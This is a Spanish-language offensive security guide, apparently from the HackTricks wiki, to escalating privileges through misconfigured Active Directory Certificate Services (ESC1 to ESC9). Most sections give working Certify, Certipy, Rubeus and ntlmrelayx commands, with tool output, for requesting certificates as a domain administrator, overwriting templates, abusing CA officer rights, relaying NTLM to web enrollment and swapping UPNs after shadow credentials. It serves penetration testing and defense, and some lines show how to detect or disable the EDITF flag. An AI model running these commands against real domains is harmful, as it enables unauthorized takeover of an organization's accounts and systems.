# AD CS Domain Escalation

{{#include ../../../banners/hacktricks-training.md}}


**Este es un resumen de las secciones de técnicas de escalada de los posts:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Misconfigured Certificate Templates - ESC1

### Explicación

### Misconfigured Certificate Templates - ESC1 Explained

- **Se conceden derechos de enrolamiento a usuarios de bajo privilegio por la Enterprise CA.**
- **No se requiere aprobación de un manager.**
- **No se necesitan firmas de personal autorizado.**
- **Los descriptores de seguridad en las plantillas de certificado son excesivamente permisivos, permitiendo que usuarios de bajo privilegio obtengan derechos de enrolamiento.**
- **Las plantillas de certificado están configuradas para definir EKUs que facilitan la autenticación:**
- Identificadores de Extended Key Usage (EKU) como Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0), o sin EKU (SubCA) están incluidos.
- **La plantilla permite que los solicitantes incluyan un subjectAltName en el Certificate Signing Request (CSR):**
- Active Directory (AD) prioriza el subjectAltName (SAN) en un certificado para la verificación de identidad si está presente. Esto significa que al especificar el SAN en un CSR, se puede solicitar un certificado para suplantar a cualquier usuario (por ejemplo, un domain administrator). Si un solicitante puede especificar un SAN queda indicado en el objeto AD de la plantilla de certificado mediante la propiedad `mspki-certificate-name-flag`. Esta propiedad es una máscara de bits, y la presencia del flag `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` permite la especificación del SAN por parte del solicitante.

> [!CAUTION]
> La configuración descrita permite a usuarios de bajo privilegio solicitar certificados con cualquier SAN a elección, habilitando la autenticación como cualquier principal del dominio vía Kerberos o SChannel.

Esta característica a veces se habilita para soportar la generación on-the-fly de certificados HTTPS o de host por productos o servicios de despliegue, o por falta de comprensión.

Se observa que crear un certificado con esta opción genera una advertencia, lo cual no ocurre cuando se duplica una plantilla de certificado existente (como la plantilla `WebServer`, que tiene `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` habilitado) y luego se modifica para incluir un OID de autenticación.

### Abuso

Para **encontrar plantillas de certificado vulnerables** puedes ejecutar:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
Para **abusar de esta vulnerabilidad para suplantar a un administrador** se podría ejecutar:
```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
/url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
-template 'ESC1' -upn 'administrator@corp.local'
```
Entonces puedes convertir el certificado generado al formato **`.pfx`** y usarlo para **autenticarte con Rubeus o certipy** de nuevo:
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Los binarios de Windows "Certreq.exe" y "Certutil.exe" se pueden usar para generar el PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

La enumeración de las plantillas de certificados dentro del esquema de configuración del bosque de AD, específicamente aquellas que no requieren aprobación ni firmas, que poseen una EKU de Client Authentication o Smart Card Logon, y con la bandera `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` habilitada, puede realizarse ejecutando la siguiente consulta LDAP:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Plantillas de certificados mal configuradas - ESC2

### Explicación

El segundo escenario de abuso es una variación del primero:

1. Se conceden derechos de enrollment a usuarios de bajo privilegio por el Enterprise CA.
2. Se desactiva el requisito de aprobación por parte del responsable.
3. Se omite la necesidad de firmas autorizadas.
4. Un descriptor de seguridad excesivamente permisivo en la plantilla de certificado concede derechos de enrollment de certificados a usuarios de bajo privilegio.
5. **La plantilla de certificado está definida para incluir el Any Purpose EKU o no EKU.**

El **Any Purpose EKU** permite que un atacante obtenga un certificado para **cualquier propósito**, incluyendo client authentication, server authentication, code signing, etc. Se puede emplear la misma **técnica usada para ESC3** para explotar este escenario.

Los certificados con **no EKUs**, que actúan como certificados de CA subordinada, pueden ser explotados para **cualquier propósito** y **también pueden usarse para firmar nuevos certificados**. Por lo tanto, un atacante podría especificar EKUs arbitrarios o campos en los nuevos certificados utilizando un certificado de CA subordinada.

Sin embargo, los nuevos certificados creados para **domain authentication** no funcionarán si la CA subordinada no está confiada por el objeto **`NTAuthCertificates`**, que es la configuración por defecto. No obstante, un atacante aún puede crear **nuevos certificados con cualquier EKU** y valores de certificado arbitrarios. Estos podrían ser potencialmente **abusados** para una amplia gama de propósitos (por ejemplo, code signing, server authentication, etc.) y podrían tener implicaciones significativas para otras aplicaciones en la red como SAML, AD FS, o IPSec.

Para enumerar las plantillas que coinciden con este escenario dentro del esquema de configuración del AD Forest, se puede ejecutar la siguiente consulta LDAP:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Plantillas de Enrollment Agent mal configuradas - ESC3

### Explicación

Este escenario es similar al primero y al segundo pero **abusando** de un **EKU diferente** (Certificate Request Agent) y **2 plantillas diferentes** (por lo tanto tiene 2 conjuntos de requisitos),

El **Certificate Request Agent EKU** (OID 1.3.6.1.4.1.311.20.2.1), conocido como **Enrollment Agent** en la documentación de Microsoft, permite a un principal **solicitar** un **certificado** en **nombre de otro usuario**.

El **“enrollment agent”** solicita una **plantilla** de ese tipo y usa el **certificado resultante para co-firmar una CSR en nombre del otro usuario**. Luego **envía** la **CSR co-firmada** a la CA, inscribiéndose en una **plantilla** que **permite “enroll on behalf of”**, y la CA responde con un **certificado perteneciente al “otro” usuario**.

**Requisitos 1:**

- La Enterprise CA otorga derechos de inscripción a usuarios de bajo privilegio.
- Se omite el requisito de aprobación del gerente.
- No hay requisito de firmas autorizadas.
- El descriptor de seguridad de la plantilla de certificado es excesivamente permisivo, otorgando derechos de inscripción a usuarios de bajo privilegio.
- La plantilla de certificado incluye el Certificate Request Agent EKU, permitiendo la solicitud de otras plantillas de certificado en nombre de otros principals.

**Requisitos 2:**

- La Enterprise CA otorga derechos de inscripción a usuarios de bajo privilegio.
- Se elude la aprobación del gerente.
- La versión del esquema de la plantilla es 1 o superior a 2, y especifica un Application Policy Issuance Requirement que requiere el Certificate Request Agent EKU.
- Un EKU definido en la plantilla de certificado permite la autenticación de dominio.
- No se aplican restricciones para los enrollment agents en la CA.

### Abuso

Puedes usar [**Certify**](https://github.com/GhostPack/Certify) o [**Certipy**](https://github.com/ly4k/Certipy) para abusar de este escenario:
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
Los **users** que están autorizados a **obtain** un **enrollment agent certificate**, las plantillas en las que los **enrollment agents** pueden inscribirse y las **accounts** en nombre de las cuales el enrollment agent puede actuar pueden ser restringidos por las CAs empresariales. Esto se consigue abriendo el snap-in `certsrc.msc`, **right-clicking on the CA**, **clicking Properties**, y luego **navigating** a la pestaña “Enrollment Agents”.

Sin embargo, se observa que la configuración **default** para las CAs es “**Do not restrict enrollment agents**.” Cuando los administradores habilitan la restricción sobre los enrollment agents, configurándola en “Restrict enrollment agents,” la configuración por defecto sigue siendo extremadamente permisiva. Permite que **Everyone** tenga acceso para enroll en todas las plantillas como cualquier usuario.

## Vulnerable Certificate Template Access Control - ESC4

### **Explanation**

El **security descriptor** en las **certificate templates** define los **permissions** que determinados **AD principals** poseen respecto a la plantilla.

Si un **attacker** posee los **permissions** necesarios para **alter** una **template** e **institute** cualquiera de las **exploitable misconfigurations** descritas en secciones previas, podría facilitarse una escalada de privilegios.

Permisos notables aplicables a las certificate templates incluyen:

- **Owner:** Concede control implícito sobre el objeto, permitiendo la modificación de cualquier atributo.
- **FullControl:** Otorga autoridad completa sobre el objeto, incluyendo la capacidad de modificar cualquier atributo.
- **WriteOwner:** Permite cambiar el owner del objeto a un principal bajo el control del atacante.
- **WriteDacl:** Permite ajustar los controles de acceso, potencialmente otorgando al atacante FullControl.
- **WriteProperty:** Autoriza la edición de cualquier propiedad del objeto.

### Abuse

Para identificar principals con derechos de edición sobre plantillas y otros objetos PKI, enumera con Certify:
```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```
<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 ocurre cuando un usuario tiene privilegios de escritura sobre una plantilla de certificado. Esto, por ejemplo, puede abusarse para sobrescribir la configuración de la plantilla de certificado y hacer que la plantilla sea vulnerable a ESC1.

Como podemos ver en la ruta anterior, solo `JOHNPC` tiene estos privilegios, pero nuestro usuario `JOHN` tiene la nueva arista `AddKeyCredentialLink` hacia `JOHNPC`. Dado que esta técnica está relacionada con certificados, también implementé este ataque, conocido como [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab). Aquí hay un pequeño adelanto del comando `shadow auto` de Certipy para recuperar el hash NT de la víctima.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** puede sobrescribir la configuración de una plantilla de certificado con un solo comando. Por **defecto**, Certipy **sobrescribirá** la configuración para hacerla **vulnerable a ESC1**. También podemos especificar el **`-save-old` parameter to save the old configuration**, lo cual será útil para **restaurar** la configuración después de nuestro ataque.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Control de Acceso a Objetos PKI Vulnerable - ESC5

### Explicación

La extensa red de relaciones interconectadas basadas en ACL, que incluye varios objetos más allá de los certificate templates y la certificate authority, puede afectar la seguridad de todo el sistema AD CS. Estos objetos, que pueden influir significativamente en la seguridad, abarcan:

- El AD computer object del servidor CA, que puede ser comprometido mediante mecanismos como S4U2Self o S4U2Proxy.
- El RPC/DCOM server del servidor CA.
- Cualquier AD object o contenedor descendiente dentro de la ruta de contenedor específica `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Esta ruta incluye, pero no se limita a, contenedores y objetos como el Certificate Templates container, Certification Authorities container, el NTAuthCertificates object y el Enrollment Services Container.

La seguridad del sistema PKI puede verse comprometida si un atacante con bajos privilegios logra controlar cualquiera de estos componentes críticos.

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Explicación

El tema tratado en el [**CQure Academy post**](https://cqureacademy.com/blog/enhanced-key-usage) también aborda las implicaciones del flag **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, según lo descrito por Microsoft. Esta configuración, cuando está activada en una Certification Authority (CA), permite la inclusión de **valores definidos por el usuario** en el **subject alternative name** para **cualquier solicitud**, incluidas aquellas construidas a partir de Active Directory®. En consecuencia, esto permite que un **intruso** se inscriba mediante **cualquier template** configurado para la **autenticación** de dominio—específicamente aquellos abiertos a la inscripción de usuarios **no privilegiados**, como el estándar User template. Como resultado, se puede obtener un certificado que permita al intruso autenticarse como administrador de dominio o **cualquier otra entidad activa** dentro del dominio.

**Nota**: El método para añadir **alternative names** en un Certificate Signing Request (CSR), mediante el argumento `-attrib "SAN:"` en `certreq.exe` (conocido como “Name Value Pairs”), contrasta con la estrategia de explotación de los SANs en ESC1. Aquí, la distinción radica en **cómo se encapsula** la información de la cuenta—dentro de un atributo del certificado, en lugar de una extensión.

### Abuso

Para verificar si la configuración está activada, las organizaciones pueden utilizar el siguiente comando con `certutil.exe`:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Esta operación emplea esencialmente **remote registry access**, por lo tanto, un enfoque alternativo podría ser:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
Herramientas como [**Certify**](https://github.com/GhostPack/Certify) y [**Certipy**](https://github.com/ly4k/Certipy) pueden detectar esta configuración incorrecta y explotarla:
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Para modificar estas configuraciones, suponiendo que se poseen **privilegios de administrador de dominio** o equivalentes, el siguiente comando puede ejecutarse desde cualquier estación de trabajo:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Para desactivar esta configuración en su entorno, la flag puede eliminarse con:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
> [!WARNING]
> Tras las actualizaciones de seguridad de mayo de 2022, los **certificados** recién emitidos contendrán una **extensión de seguridad** que incorpora la **propiedad `objectSid` del solicitante**. Para ESC1, este SID se deriva del SAN especificado. Sin embargo, para **ESC6**, el SID refleja el **`objectSid` del solicitante**, no el SAN.\
> Para explotar ESC6, es esencial que el sistema sea susceptible a ESC10 (Weak Certificate Mappings), que prioriza el **SAN sobre la nueva extensión de seguridad**.

## Control de Acceso Vulnerable de la Autoridad de Certificación - ESC7

### Ataque 1

#### Explicación

El control de acceso de una autoridad de certificación se mantiene mediante un conjunto de permisos que gobiernan las acciones del CA. Estos permisos se pueden ver accediendo a `certsrv.msc`, haciendo clic derecho en una CA, seleccionando propiedades y luego navegando a la pestaña Seguridad. Además, los permisos se pueden enumerar usando el módulo PSPKI con comandos como:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
This provides insights into the primary rights, namely **`ManageCA`** and **`ManageCertificates`**, correlating to the roles of “administrador de CA” y “administrador de certificados” respectivamente.

#### Abuse

Tener permisos **`ManageCA`** en una certificate authority permite al principal manipular ajustes de forma remota usando PSPKI. Esto incluye alternar la bandera **`EDITF_ATTRIBUTESUBJECTALTNAME2`** para permitir la especificación de SAN en cualquier plantilla, un aspecto crítico para la escalada de dominio.

La simplificación de este proceso es posible mediante el uso del cmdlet **Enable-PolicyModuleFlag** de PSPKI, lo que permite realizar modificaciones sin interacción directa con la GUI.

La posesión de permisos **`ManageCertificates`** facilita la aprobación de solicitudes pendientes, eludiendo efectivamente la salvaguarda de "aprobación del administrador de certificados de la CA".

Se puede utilizar una combinación de los módulos **Certify** y **PSPKI** para solicitar, aprobar y descargar un certificado:
```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Ataque 2

#### Explicación

> [!WARNING]
> En el **ataque anterior** **`Manage CA`** permissions se utilizaron para **habilitar** la bandera **EDITF_ATTRIBUTESUBJECTALTNAME2** para realizar el **ESC6 attack**, pero esto no tendrá efecto hasta que el servicio de CA (`CertSvc`) se reinicie. Cuando un usuario tiene el `Manage CA` access right, al usuario también se le permite **reiniciar el servicio**. Sin embargo, esto **no significa que el usuario pueda reiniciar el servicio de forma remota**. Además, E**SC6 podría no funcionar de forma inmediata** en la mayoría de los entornos parcheados debido a las actualizaciones de seguridad de May 2022.

Por lo tanto, aquí se presenta otro ataque.

Requisitos previos:

- Solo **`ManageCA` permission**
- **`Manage Certificates`** permission (puede ser otorgado desde **`ManageCA`**)
- La plantilla de certificado **`SubCA`** debe estar **enabled** (puede ser enabled desde **`ManageCA`**)

La técnica se basa en el hecho de que los usuarios con los derechos de acceso `Manage CA` _y_ `Manage Certificates` pueden **emitir solicitudes de certificado fallidas**. La plantilla de certificado **`SubCA`** es **vulnerable a ESC1**, pero **solo los administrators** pueden inscribirse en la plantilla. Así, un **user** puede **request** inscribirse en la **`SubCA`** — lo cual será **denegado** — pero **luego emitido por el gestor**.

#### Abuse

Puedes **concederte el `Manage Certificates`** access right añadiendo tu usuario como un nuevo officer.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
La plantilla **`SubCA`** se puede **habilitar en la CA** con el parámetro `-enable-template`. Por defecto, la plantilla `SubCA` está habilitada.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
Si hemos cumplido los prerrequisitos para este ataque, podemos empezar por **solicitar un certificado basado en la plantilla `SubCA`**.

**Esta solicitud será denegada**, pero guardaremos la clave privada y anotaremos el ID de solicitud.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
Con nuestros **`Manage CA` y `Manage Certificates`**, podemos entonces **emitir la solicitud de certificado fallida** con el comando `ca` y el parámetro `-issue-request <request ID>`.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
Y finalmente, podemos **recuperar el certificado emitido** con el comando `req` y el parámetro `-retrieve <request ID>`.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
### Ataque 3 – Abuso de Manage Certificates Extension (SetExtension)

#### Explicación

Además de los abusos clásicos de ESC7 (habilitar atributos EDITF o aprobar solicitudes pendientes), **Certify 2.0** reveló una nueva primitiva que solo requiere el rol *Manage Certificates* (también conocido como **Certificate Manager / Officer**) en la CA empresarial.

El método RPC `ICertAdmin::SetExtension` puede ser ejecutado por cualquier principal que posea *Manage Certificates*. Si bien el método era tradicionalmente usado por CAs legítimas para actualizar extensiones en solicitudes **pendientes**, un atacante puede abusar de él para **añadir una extensión de certificado *no por defecto*** (por ejemplo, un OID personalizado de *Certificate Issuance Policy* como `1.1.1.1`) a una solicitud que está esperando aprobación.

Debido a que la plantilla objetivo **no define un valor por defecto para esa extensión**, la CA NO sobrescribirá el valor controlado por el atacante cuando la solicitud sea finalmente emitida. Por lo tanto, el certificado resultante contiene una extensión elegida por el atacante que puede:

* Satisfacer los requisitos de Application / Issuance Policy de otras plantillas vulnerables (provocando escalada de privilegios).
* Inyectar EKUs adicionales o políticas que otorguen al certificado una confianza inesperada en sistemas de terceros.

En resumen, *Manage Certificates* —antes considerado la mitad “menos poderosa” de ESC7— ahora puede aprovecharse para una escalada de privilegios completa o persistencia a largo plazo, sin modificar la configuración de la CA ni requerir el más restrictivo derecho *Manage CA*.

#### Abusando de la primitiva con Certify 2.0

1. **Submit a certificate request that will remain *pending*.**  This can be forced with a template that requires manager approval:
```powershell
Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
# Take note of the returned Request ID
```

2. **Append a custom extension to the pending request** using the new `manage-ca` command:
```powershell
Certify.exe manage-ca --ca SERVER\\CA-NAME \
--request-id 1337 \
--set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
```
*Si la plantilla no define ya la extensión *Certificate Issuance Policies*, el valor anterior se conservará tras la emisión.*

3. **Issue the request** (if your role also has *Manage Certificates* approval rights) or wait for an operator to approve it.  Once issued, download the certificate:
```powershell
Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
```

4. The resulting certificate now contains the malicious issuance-policy OID and can be used in subsequent attacks (e.g. ESC13, domain escalation, etc.).

> NOTA: El mismo ataque puede ejecutarse con Certipy ≥ 4.7 mediante el comando `ca` y el parámetro `-set-extension`.

## NTLM Relay a endpoints HTTP de AD CS – ESC8

### Explicación

> [!TIP]
> En entornos donde **AD CS está instalado**, si existe un **web enrollment endpoint vulnerable** y al menos una **certificate template** publicada que permite **domain computer enrollment and client authentication** (como la plantilla por defecto **`Machine`**), ¡se vuelve posible que **cualquier equipo con el servicio spooler activo sea comprometido por un atacante**!

Varios métodos de inscripción basados en HTTP son soportados por AD CS, disponibles mediante roles adicionales de servidor que los administradores pueden instalar. Estas interfaces para el enrolamiento de certificados vía HTTP son susceptibles a **NTLM relay attacks**. Un atacante, desde una **máquina comprometida, puede suplantar cualquier cuenta AD que se autentique mediante NTLM entrante**. Mientras suplanta la cuenta víctima, estas interfaces web pueden ser accedidas por un atacante para **solicitar un certificado de client authentication usando las certificate templates `User` o `Machine`**.

- La **web enrollment interface** (una aplicación ASP más antigua disponible en `http://<caserver>/certsrv/`), por defecto usa solo HTTP, lo que no ofrece protección contra **NTLM relay attacks**. Además, permite explícitamente únicamente autenticación NTLM a través de su cabecera Authorization HTTP, haciendo inaplicables métodos de autenticación más seguros como Kerberos.
- El **Certificate Enrollment Service** (CES), **Certificate Enrollment Policy** (CEP) Web Service, y **Network Device Enrollment Service** (NDES) por defecto soportan negotiate authentication mediante su cabecera Authorization HTTP. Negotiate authentication **soporta ambos** Kerberos y **NTLM**, permitiendo a un atacante **degradar a NTLM** la autenticación durante ataques de relay. Aunque estos servicios web habilitan HTTPS por defecto, HTTPS por sí solo **no protege contra NTLM relay attacks**. La protección contra NTLM relay attacks para servicios HTTPS solo es posible cuando HTTPS se combina con channel binding. Lamentablemente, AD CS no activa Extended Protection for Authentication en IIS, que es requerida para channel binding.

Un problema común con los NTLM relay attacks es la **corta duración de las sesiones NTLM** y la incapacidad del atacante para interactuar con servicios que **requieren NTLM signing**.

No obstante, esta limitación se supera explotando un NTLM relay attack para obtener un certificado para el usuario, ya que el periodo de validez del certificado determina la duración de la sesión, y el certificado puede usarse con servicios que **requieren NTLM signing**. Para instrucciones sobre cómo utilizar un certificado robado, consúltese:


{{#ref}}
account-persistence.md
{{#endref}}

Otra limitación de los NTLM relay attacks es que **una máquina controlada por el atacante debe ser autenticada por una cuenta víctima**. El atacante puede esperar o intentar **forzar** esta autenticación:


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Abuso**

[**Certify**](https://github.com/GhostPack/Certify) `cas` enumera los **endpoints HTTP de AD CS habilitados**:
```
Certify.exe cas
```
<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

La propiedad `msPKI-Enrollment-Servers` es utilizada por las Autoridades de Certificación (CAs) empresariales para almacenar los endpoints del Servicio de Inscripción de Certificados (CES). Estos endpoints pueden ser analizados y listados utilizando la herramienta **Certutil.exe**:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Abuso con Certify
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Abuso con [Certipy](https://github.com/ly4k/Certipy)

La solicitud de un certificado la hace Certipy por defecto basándose en la plantilla `Machine` o `User`, determinada por si el nombre de la cuenta que se está reenviando termina en `$`. La especificación de una plantilla alternativa se puede lograr mediante el uso del parámetro `-template`.

Entonces se puede emplear una técnica como [PetitPotam](https://github.com/ly4k/PetitPotam) para forzar la autenticación. Cuando se trata de controladores de dominio, se requiere especificar `-template DomainController`.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## Sin extensión de seguridad - ESC9 <a href="#id-5485" id="id-5485"></a>

### Explicación

El nuevo valor **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) para **`msPKI-Enrollment-Flag`**, referido como ESC9, impide la incrustación de la **nueva extensión de seguridad `szOID_NTDS_CA_SECURITY_EXT`** en un certificado. Este flag cobra relevancia cuando `StrongCertificateBindingEnforcement` está configurado a `1` (ajuste por defecto), en contraste con un valor de `2`. Su importancia aumenta en escenarios donde podría explotarse un mapeo de certificado más débil para Kerberos o Schannel (como en ESC10), dado que la ausencia de ESC9 no alteraría los requisitos.

Las condiciones bajo las cuales la configuración de este flag se vuelve significativa incluyen:

- `StrongCertificateBindingEnforcement` no está ajustado a `2` (siendo `1` el valor por defecto), o `CertificateMappingMethods` incluye el flag `UPN`.
- El certificado está marcado con el flag `CT_FLAG_NO_SECURITY_EXTENSION` dentro de la configuración `msPKI-Enrollment-Flag`.
- Cualquier EKU de client authentication está especificado por el certificado.
- Se dispone de permisos `GenericWrite` sobre cualquier cuenta para comprometer a otra.

### Escenario de abuso

Supongamos que `John@corp.local` tiene permisos `GenericWrite` sobre `Jane@corp.local`, con el objetivo de comprometer a `Administrator@corp.local`. La plantilla de certificado `ESC9`, en la que `Jane@corp.local` tiene permiso para enrollarse, está configurada con el flag `CT_FLAG_NO_SECURITY_EXTENSION` en su ajuste `msPKI-Enrollment-Flag`.

Inicialmente, el hash de `Jane` se obtiene usando Shadow Credentials, gracias al `GenericWrite` de `John`:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
Posteriormente, el `userPrincipalName` de `Jane` se modifica a `Administrator`, omitiendo intencionadamente la parte de dominio `@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Esta modificación no viola las restricciones, dado que `Administrator@corp.local` sigue siendo distinto como el userPrincipalName de `Administrator`.

A continuación, la plantilla de certificado `ESC9`, marcada como vulnerable, se solicita como `Jane`:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
Se observa que el `userPrincipalName` del certificado refleja `Administrator`, sin ningún “object SID”.
